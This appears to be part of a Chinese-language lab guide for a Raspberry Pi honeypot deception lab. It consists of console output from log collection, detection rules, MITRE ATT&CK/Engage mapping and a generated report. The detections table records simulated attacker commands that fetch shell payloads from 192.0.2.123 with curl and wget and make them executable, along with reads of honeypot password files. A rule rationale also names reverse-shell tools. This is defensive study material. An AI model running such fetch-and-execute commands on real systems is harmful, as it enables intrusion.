-rw-rw-r-- 1 lss lss 6.1K May 22 03:45 mapping_summary.json

[+] Event summary:
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "detections_by_severity": {
    "high": 21,
    "medium": 17
  },
  "events_by_source": {
    "cowrie": 38,
    "fake-web": 38
  },
  "events_by_type": {
    "ssh_command": 27,
    "ssh_connection": 4,
    "ssh_login_failed": 1,
    "ssh_login_success": 3,
    "ssh_logout": 3,
    "web_honeyfile_access": 5,
    "web_login_attempt": 6,
    "web_request": 27
  },
  "generated_at": "2026-05-22T21:58:59.382273+00:00",
  "total_detections": 38,
  "total_events": 76
}
[+] Running MITRE mapping analyzer...
[+] Mapping analysis completed.
[+] Mapping summary: /opt/deception-lab/data/events/mapping_summary.json
[+] ATT&CK coverage: /opt/deception-lab/data/events/attack_coverage.json
[+] Engage coverage: /opt/deception-lab/data/events/engage_coverage.json

Defined detection rules: 8
Total detections: 38
ATT&CK mapping coverage: 100.0%
Engage mapping coverage: 100.0%

[+] Generating mapping Markdown report...
[+] Mapping markdown report written to: /opt/deception-lab/reports/mapping_report.md

[+] Mapping output files:
-rw-rw-r-- 1 lss lss 3.1K May 23 05:58 attack_coverage.json
-rw-rw-r-- 1 lss lss 2.3K May 23 05:58 engage_coverage.json
-rw-rw-r-- 1 lss lss 6.3K May 23 05:58 mapping_summary.json

[+] Mapping report:
-rw-rw-r-- 1 lss lss 2.4K May 23 05:58 /opt/deception-lab/reports/mapping_report.md

[+] Mapping summary:
{
  "attack_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "defined_detection_rules": 8,
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "engage_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "generated_at": "2026-05-22T21:58:59.459856+00:00",
  "input_detections": "/opt/deception-lab/data/events/detections.jsonl",
  "per_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": {
      "attack": {
        "rationale": "The attacker used a credential intentionally planted in deception assets. This indicates exposure to unsecured credential material.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 3,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "A planted SSH credential caused the adversary to reveal credential-use behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Attempting to read honeyfiles such as secrets.txt or backup_config.ini indicates interest in local sensitive data.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 6,
      "engage": {
        "activity": "Reveal Adversary Intent",
        "goal": "Elicit",
        "rationale": "Honeyfile access attempts reveal interest in sensitive files, backup data, credentials, and local configuration.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_LOGIN_FAILED": {
      "attack": {
        "rationale": "Failed SSH authentication attempts against the honeypot indicate password guessing or brute-force behavior.\n",
        "tactic": "Credential Access",
        "technique": "Brute Force",
        "technique_id": "T1110"
      },
      "detections": 1,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The SSH honeypot exposes a fake login surface for observing authentication attempts.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_RECON_COMMAND": {
      "attack": {
        "rationale": "Commands such as whoami, pwd, ls, uname, ip addr, ifconfig, ps, and netstat indicate post-login discovery activity.\n",
        "related_techniques": [
          "T1033 System Owner/User Discovery",
          "T1016 System Network Configuration Discovery",
          "T1057 Process Discovery"
        ],
        "tactic": "Discovery",
        "technique": "System Information Discovery",
        "technique_id": "T1082"
      },
      "detections": 11,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Commands entered after login reveal adversary discovery interests and operating style.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_TOOL_TRANSFER_COMMAND": {
      "attack": {
        "rationale": "Commands such as wget, curl, ftp, scp, chmod, nc, or bash reverse shell patterns may indicate tool staging or payload transfer.\n",
        "tactic": "Command and Control",
        "technique": "Ingress Tool Transfer",
        "technique_id": "T1105"
      },
      "detections": 4,
      "engage": {
        "activity": "Adversary Direction",
        "goal": "Affect",
        "rationale": "A decoy shell can influence attacker behavior and redirect tool staging activity into a controlled observation environment.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYCREDENTIAL_USED": {
      "attack": {
        "rationale": "Submitting a planted credential to the fake web login panel indicates the adversary discovered and attempted to use unsecured credentials.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 3,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "Planted web credentials elicit credential reuse behavior against the fake admin panel.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Downloading honeyfiles from the fake web panel indicates attempted collection of local or exposed files.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 5,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Honeyfile download behavior helps identify the attacker's collection interests.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_SCANNER_PROBE": {
      "attack": {
        "rationale": "Requests to paths such as /.env, /wp-admin, /phpmyadmin, or /admin indicate web probing or scanning behavior.\n",
        "tactic": "Reconnaissance",
        "technique": "Active Scanning",
        "technique_id": "T1595"
      },
      "detections": 5,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The fake web interface exposes probeable paths to observe scanner behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    }
  },
  "total_detections": 38,
  "triggered_detection_rules": [
    "SSH_HONEYCREDENTIAL_LOGIN",
    "SSH_HONEYFILE_ACCESS",
    "SSH_LOGIN_FAILED",
    "SSH_RECON_COMMAND",
    "SSH_TOOL_TRANSFER_COMMAND",
    "WEB_HONEYCREDENTIAL_USED",
    "WEB_HONEYFILE_ACCESS",
    "WEB_SCANNER_PROBE"
  ]
}
```
- 查看 mapping coverage：
```
/opt/deception-lab/scripts/show_mapping.sh

# 你應該仍然看到：
ATT&CK mapping coverage: 100.0%
Engage mapping coverage: 100.0%
# 而 ATT&CK coverage 應該可能增加：
Command and Control
Reconnaissance

# 如果你成功觸發 SSH_TOOL_TRANSFER_COMMAND 與 WEB_SCANNER_PROBE，就會出現：
T1105 Ingress Tool Transfer
T1595 Active Scanning

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/show_mapping.sh
=== Mapping Files ===
-rw-rw-r-- 1 lss lss 3.1K May 23 05:58 attack_coverage.json
-rw-rw-r-- 1 lss lss 2.3K May 23 05:58 engage_coverage.json
-rw-rw-r-- 1 lss lss 6.3K May 23 05:58 mapping_summary.json

=== Mapping Summary ===
{
  "attack_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "defined_detection_rules": 8,
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "engage_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "generated_at": "2026-05-22T21:58:59.459856+00:00",
  "input_detections": "/opt/deception-lab/data/events/detections.jsonl",
  "per_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": {
      "attack": {
        "rationale": "The attacker used a credential intentionally planted in deception assets. This indicates exposure to unsecured credential material.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 3,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "A planted SSH credential caused the adversary to reveal credential-use behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Attempting to read honeyfiles such as secrets.txt or backup_config.ini indicates interest in local sensitive data.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 6,
      "engage": {
        "activity": "Reveal Adversary Intent",
        "goal": "Elicit",
        "rationale": "Honeyfile access attempts reveal interest in sensitive files, backup data, credentials, and local configuration.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_LOGIN_FAILED": {
      "attack": {
        "rationale": "Failed SSH authentication attempts against the honeypot indicate password guessing or brute-force behavior.\n",
        "tactic": "Credential Access",
        "technique": "Brute Force",
        "technique_id": "T1110"
      },
      "detections": 1,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The SSH honeypot exposes a fake login surface for observing authentication attempts.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_RECON_COMMAND": {
      "attack": {
        "rationale": "Commands such as whoami, pwd, ls, uname, ip addr, ifconfig, ps, and netstat indicate post-login discovery activity.\n",
        "related_techniques": [
          "T1033 System Owner/User Discovery",
          "T1016 System Network Configuration Discovery",
          "T1057 Process Discovery"
        ],
        "tactic": "Discovery",
        "technique": "System Information Discovery",
        "technique_id": "T1082"
      },
      "detections": 11,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Commands entered after login reveal adversary discovery interests and operating style.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_TOOL_TRANSFER_COMMAND": {
      "attack": {
        "rationale": "Commands such as wget, curl, ftp, scp, chmod, nc, or bash reverse shell patterns may indicate tool staging or payload transfer.\n",
        "tactic": "Command and Control",
        "technique": "Ingress Tool Transfer",
        "technique_id": "T1105"
      },
      "detections": 4,
      "engage": {
        "activity": "Adversary Direction",
        "goal": "Affect",
        "rationale": "A decoy shell can influence attacker behavior and redirect tool staging activity into a controlled observation environment.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYCREDENTIAL_USED": {
      "attack": {
        "rationale": "Submitting a planted credential to the fake web login panel indicates the adversary discovered and attempted to use unsecured credentials.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 3,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "Planted web credentials elicit credential reuse behavior against the fake admin panel.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Downloading honeyfiles from the fake web panel indicates attempted collection of local or exposed files.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 5,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Honeyfile download behavior helps identify the attacker's collection interests.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_SCANNER_PROBE": {
      "attack": {
        "rationale": "Requests to paths such as /.env, /wp-admin, /phpmyadmin, or /admin indicate web probing or scanning behavior.\n",
        "tactic": "Reconnaissance",
        "technique": "Active Scanning",
        "technique_id": "T1595"
      },
      "detections": 5,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The fake web interface exposes probeable paths to observe scanner behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    }
  },
  "total_detections": 38,
  "triggered_detection_rules": [
    "SSH_HONEYCREDENTIAL_LOGIN",
    "SSH_HONEYFILE_ACCESS",
    "SSH_LOGIN_FAILED",
    "SSH_RECON_COMMAND",
    "SSH_TOOL_TRANSFER_COMMAND",
    "WEB_HONEYCREDENTIAL_USED",
    "WEB_HONEYFILE_ACCESS",
    "WEB_SCANNER_PROBE"
  ]
}

=== ATT&CK Detection Coverage ===
--- Tactics ---
{
  "Collection": 11,
  "Command and Control": 4,
  "Credential Access": 7,
  "Discovery": 11,
  "Reconnaissance": 5
}

--- Techniques ---
{
  "T1005 Data from Local System": 11,
  "T1082 System Information Discovery": 11,
  "T1105 Ingress Tool Transfer": 4,
  "T1110 Brute Force": 1,
  "T1552 Unsecured Credentials": 6,
  "T1595 Active Scanning": 5
}

=== Engage Detection Coverage ===
--- Goals ---
{
  "Affect": 4,
  "Elicit": 12,
  "Expose": 6,
  "Understand": 16
}

--- Activities ---
{
  "Affect: Adversary Direction": 4,
  "Elicit: Credential Collection": 6,
  "Elicit: Reveal Adversary Intent": 6,
  "Expose: Expose Decoy Service": 6,
  "Understand: Collect Adversary Behavior": 16
}
```

### Step 11.17：重新產生正式報告
- 執行：
```
/opt/deception-lab/scripts/generate_report.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/generate_report.sh
[+] Refreshing parser and mapping outputs...
[+] Running parser first to refresh detections...
[+] Collecting latest logs...
[+] Collecting logs at UTC time: 20260522T220411Z
[+] Exporting Cowrie Docker logs...
[+] Collecting Fake Web access log...
[+] Collecting Fake Web auth log...
[+] Creating source manifest...
[+] Creating collection summary...
[+] Archiving collected logs...

[+] Collection completed.
[+] Current collected directory:
total 64K
drwxrwxr-x 2 lss lss 4.0K May 15 07:18 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss  370 May 23 06:04 collection_summary.txt
-rw-rw-r-- 1 lss lss  28K May 23 06:04 cowrie-docker.log
-rw-rw-r-- 1 lss lss  579 May 15 07:18 README.md
-rw-rw-r-- 1 lss lss  777 May 23 06:04 source_manifest.json
-rwxrwxr-x 1 lss lss  11K May 23 06:04 web_access.jsonl
-rwxrwxr-x 1 lss lss 2.5K May 23 06:04 web_auth.jsonl

[+] Summary:
Collection time UTC: 20260522T220411Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 28K
  lines: 220
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 12K
  lines: 32
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 6
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26

[+] Running event parser...
[+] Parsing completed.
[+] Events written to: /opt/deception-lab/data/events/events.jsonl
[+] Detections written to: /opt/deception-lab/data/events/detections.jsonl
[+] Summary written to: /opt/deception-lab/data/events/events_summary.json

Total events: 76
Total detections: 38

[+] Event output files:
total 80K
drwxrwxr-x 2 lss lss 4.0K May 21 07:53 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss 3.1K May 23 05:58 attack_coverage.json
-rw-rw-r-- 1 lss lss  24K May 23 06:04 detections.jsonl
-rw-rw-r-- 1 lss lss 2.3K May 23 05:58 engage_coverage.json
-rw-rw-r-- 1 lss lss  27K May 23 06:04 events.jsonl
-rw-rw-r-- 1 lss lss  753 May 23 06:04 events_summary.json
-rw-rw-r-- 1 lss lss 6.3K May 23 05:58 mapping_summary.json

[+] Event summary:
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "detections_by_severity": {
    "high": 21,
    "medium": 17
  },
  "events_by_source": {
    "cowrie": 38,
    "fake-web": 38
  },
  "events_by_type": {
    "ssh_command": 27,
    "ssh_connection": 4,
    "ssh_login_failed": 1,
    "ssh_login_success": 3,
    "ssh_logout": 3,
    "web_honeyfile_access": 5,
    "web_login_attempt": 6,
    "web_request": 27
  },
  "generated_at": "2026-05-22T22:04:11.312934+00:00",
  "total_detections": 38,
  "total_events": 76
}
[+] Running MITRE mapping analyzer...
[+] Mapping analysis completed.
[+] Mapping summary: /opt/deception-lab/data/events/mapping_summary.json
[+] ATT&CK coverage: /opt/deception-lab/data/events/attack_coverage.json
[+] Engage coverage: /opt/deception-lab/data/events/engage_coverage.json

Defined detection rules: 8
Total detections: 38
ATT&CK mapping coverage: 100.0%
Engage mapping coverage: 100.0%

[+] Generating mapping Markdown report...
[+] Mapping markdown report written to: /opt/deception-lab/reports/mapping_report.md

[+] Mapping output files:
-rw-rw-r-- 1 lss lss 3.1K May 23 06:04 attack_coverage.json
-rw-rw-r-- 1 lss lss 2.3K May 23 06:04 engage_coverage.json
-rw-rw-r-- 1 lss lss 6.3K May 23 06:04 mapping_summary.json

[+] Mapping report:
-rw-rw-r-- 1 lss lss 2.4K May 23 06:04 /opt/deception-lab/reports/mapping_report.md

[+] Mapping summary:
{
  "attack_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "defined_detection_rules": 8,
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "engage_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "generated_at": "2026-05-22T22:04:11.389402+00:00",
  "input_detections": "/opt/deception-lab/data/events/detections.jsonl",
  "per_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": {
      "attack": {
        "rationale": "The attacker used a credential intentionally planted in deception assets. This indicates exposure to unsecured credential material.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 3,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "A planted SSH credential caused the adversary to reveal credential-use behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Attempting to read honeyfiles such as secrets.txt or backup_config.ini indicates interest in local sensitive data.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 6,
      "engage": {
        "activity": "Reveal Adversary Intent",
        "goal": "Elicit",
        "rationale": "Honeyfile access attempts reveal interest in sensitive files, backup data, credentials, and local configuration.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_LOGIN_FAILED": {
      "attack": {
        "rationale": "Failed SSH authentication attempts against the honeypot indicate password guessing or brute-force behavior.\n",
        "tactic": "Credential Access",
        "technique": "Brute Force",
        "technique_id": "T1110"
      },
      "detections": 1,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The SSH honeypot exposes a fake login surface for observing authentication attempts.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_RECON_COMMAND": {
      "attack": {
        "rationale": "Commands such as whoami, pwd, ls, uname, ip addr, ifconfig, ps, and netstat indicate post-login discovery activity.\n",
        "related_techniques": [
          "T1033 System Owner/User Discovery",
          "T1016 System Network Configuration Discovery",
          "T1057 Process Discovery"
        ],
        "tactic": "Discovery",
        "technique": "System Information Discovery",
        "technique_id": "T1082"
      },
      "detections": 11,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Commands entered after login reveal adversary discovery interests and operating style.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_TOOL_TRANSFER_COMMAND": {
      "attack": {
        "rationale": "Commands such as wget, curl, ftp, scp, chmod, nc, or bash reverse shell patterns may indicate tool staging or payload transfer.\n",
        "tactic": "Command and Control",
        "technique": "Ingress Tool Transfer",
        "technique_id": "T1105"
      },
      "detections": 4,
      "engage": {
        "activity": "Adversary Direction",
        "goal": "Affect",
        "rationale": "A decoy shell can influence attacker behavior and redirect tool staging activity into a controlled observation environment.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYCREDENTIAL_USED": {
      "attack": {
        "rationale": "Submitting a planted credential to the fake web login panel indicates the adversary discovered and attempted to use unsecured credentials.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 3,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "Planted web credentials elicit credential reuse behavior against the fake admin panel.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Downloading honeyfiles from the fake web panel indicates attempted collection of local or exposed files.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 5,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Honeyfile download behavior helps identify the attacker's collection interests.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_SCANNER_PROBE": {
      "attack": {
        "rationale": "Requests to paths such as /.env, /wp-admin, /phpmyadmin, or /admin indicate web probing or scanning behavior.\n",
        "tactic": "Reconnaissance",
        "technique": "Active Scanning",
        "technique_id": "T1595"
      },
      "detections": 5,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The fake web interface exposes probeable paths to observe scanner behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    }
  },
  "total_detections": 38,
  "triggered_detection_rules": [
    "SSH_HONEYCREDENTIAL_LOGIN",
    "SSH_HONEYFILE_ACCESS",
    "SSH_LOGIN_FAILED",
    "SSH_RECON_COMMAND",
    "SSH_TOOL_TRANSFER_COMMAND",
    "WEB_HONEYCREDENTIAL_USED",
    "WEB_HONEYFILE_ACCESS",
    "WEB_SCANNER_PROBE"
  ]
}

[+] Generating timeline and final reports...
/opt/deception-lab/parser/generate_timeline.py:93: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  lines.append(f"Generated at: {datetime.utcnow().isoformat()}Z")
[+] Timeline written to: /opt/deception-lab/reports/timeline.md
[+] Markdown report written to: /opt/deception-lab/reports/report.md
[+] JSON report written to: /opt/deception-lab/reports/report.json

[+] Report files:
total 60K
drwxrwxr-x 2 lss lss 4.0K May 22 03:11 .
drwxr-xr-x 8 lss lss 4.0K May 22 03:32 ..
-rw-rw-r-- 1 lss lss 2.4K May 23 06:04 mapping_report.md
-rw-rw-r-- 1 lss lss  13K May 23 06:04 report.json
-rw-rw-r-- 1 lss lss 5.9K May 23 06:04 report.md
-rw-rw-r-- 1 lss lss  21K May 23 06:04 timeline.md

[+] Report generation completed.
Main report: /opt/deception-lab/reports/report.md
Timeline:    /opt/deception-lab/reports/timeline.md
JSON report: /opt/deception-lab/reports/report.json
```
- 查看 summary：
```
cat /opt/deception-lab/reports/report.json | jq '.summary'

# 執行結果：
lss@lss:/opt/deception-lab $ cat /opt/deception-lab/reports/report.json | jq '.summary'
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "detections_by_severity": {
    "high": 21,
    "medium": 17
  },
  "events_by_source": {
    "cowrie": 38,
    "fake-web": 38
  },
  "events_by_type": {
    "ssh_command": 27,
    "ssh_connection": 4,
    "ssh_login_failed": 1,
    "ssh_login_success": 3,
    "ssh_logout": 3,
    "web_honeyfile_access": 5,
    "web_login_attempt": 6,
    "web_request": 27
  },
  "honeycredential_detections": 6,
  "honeyfile_detections": 11,
  "total_detections": 38,
  "total_events": 76
}
```
- 查看 report：
```
head -n 120 /opt/deception-lab/reports/report.md

# 執行結果：
lss@lss:/opt/deception-lab $ head -n 120 /opt/deception-lab/reports/report.md
# Raspberry Pi Deception Lab MVP Report

Generated at: `2026-05-22T22:04:11.520522+00:00`

## 1. Executive Summary

This report summarizes events collected from the Raspberry Pi deception lab MVP.
The lab includes a Cowrie SSH honeypot, a fake web admin panel, honeycredentials, honeyfiles, centralized log collection, detection rules, and MITRE mapping.

| Metric | Value |
| --- | --- |
| Total events | 76 |
| Total detections | 38 |
| Honeycredential detections | 6 |
| Honeyfile detections | 11 |
| ATT&CK mapping coverage | 100.0% |
| Engage mapping coverage | 100.0% |

## 2. Event Summary

### Events by Source

| Source | Count |
| --- | --- |
| cowrie | 38 |
| fake-web | 38 |

### Events by Type

| Event Type | Count |
| --- | --- |
| ssh_command | 27 |
| ssh_connection | 4 |
| ssh_login_failed | 1 |
| ssh_login_success | 3 |
| ssh_logout | 3 |
| web_honeyfile_access | 5 |
| web_login_attempt | 6 |
| web_request | 27 |

## 3. Detection Summary

### Detections by Severity

| Severity | Count |
| --- | --- |
| high | 21 |
| medium | 17 |

### Detections by Rule

| Rule ID | Count |
| --- | --- |
| SSH_HONEYCREDENTIAL_LOGIN | 3 |
| SSH_HONEYFILE_ACCESS | 6 |
| SSH_LOGIN_FAILED | 1 |
| SSH_RECON_COMMAND | 11 |
| SSH_TOOL_TRANSFER_COMMAND | 4 |
| WEB_HONEYCREDENTIAL_USED | 3 |
| WEB_HONEYFILE_ACCESS | 5 |
| WEB_SCANNER_PROBE | 5 |

## 4. Top Detections

| Timestamp | Severity | Rule | Source | Src IP | Username | Observed Behavior | ATT&CK | Engage |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 2026-05-21T20:22:35.106787+00:00 | high | WEB_HONEYFILE_ACCESS | fake-web | 172.18.0.1 |  | /download/database_passwords.txt | T1005 Data from Local System | Understand: Collect Adversary Behavior |
| 2026-05-21T20:22:28.787061+00:00 | high | WEB_HONEYFILE_ACCESS | fake-web | 172.18.0.1 |  | /download/backup_config.ini | T1005 Data from Local System | Understand: Collect Adversary Behavior |
| 2026-05-21T20:22:22.565328+00:00 | high | WEB_HONEYFILE_ACCESS | fake-web | 172.18.0.1 |  | /download/secrets.txt | T1005 Data from Local System | Understand: Collect Adversary Behavior |
| 2026-05-21T20:13:55.354969+00:00 | high | WEB_HONEYCREDENTIAL_USED | fake-web | 172.18.0.1 | backup |  | T1552 Unsecured Credentials | Elicit: Credential Collection |
| 2026-05-21T20:07:15+00:00 | high | SSH_TOOL_TRANSFER_COMMAND | cowrie | 172.18.0.1 |  | chmod +x /tmp/payload.sh | T1105 Ingress Tool Transfer | Affect: Adversary Direction |
| 2026-05-21T20:06:54+00:00 | high | SSH_TOOL_TRANSFER_COMMAND | cowrie | 172.18.0.1 |  | curl http://192.0.2.123/payload.sh -o /tmp/payload.sh | T1105 Ingress Tool Transfer | Affect: Adversary Direction |
| 2026-05-21T20:06:35+00:00 | high | SSH_TOOL_TRANSFER_COMMAND | cowrie | 172.18.0.1 |  | wget http://192.0.2.123/a.sh | T1105 Ingress Tool Transfer | Affect: Adversary Direction |
| 2026-05-21T20:05:51+00:00 | high | SSH_HONEYFILE_ACCESS | cowrie | 172.18.0.1 |  | cat /etc/edge-gateway/app.conf | T1005 Data from Local System | Elicit: Reveal Adversary Intent |
| 2026-05-21T20:05:45+00:00 | high | SSH_HONEYFILE_ACCESS | cowrie | 172.18.0.1 |  | cat /home/backup/backup_jobs.txt | T1005 Data from Local System | Elicit: Reveal Adversary Intent |
| 2026-05-21T20:05:39+00:00 | high | SSH_HONEYFILE_ACCESS | cowrie | 172.18.0.1 |  | cat /home/admin/database_passwords.txt | T1005 Data from Local System | Elicit: Reveal Adversary Intent |

## 5. MITRE ATT&CK Coverage

### By Tactic

| Tactic | Detection Count |
| --- | --- |
| Collection | 11 |
| Command and Control | 4 |
| Credential Access | 7 |
| Discovery | 11 |
| Reconnaissance | 5 |

### By Technique

| Technique | Detection Count |
| --- | --- |
| T1005 Data from Local System | 11 |
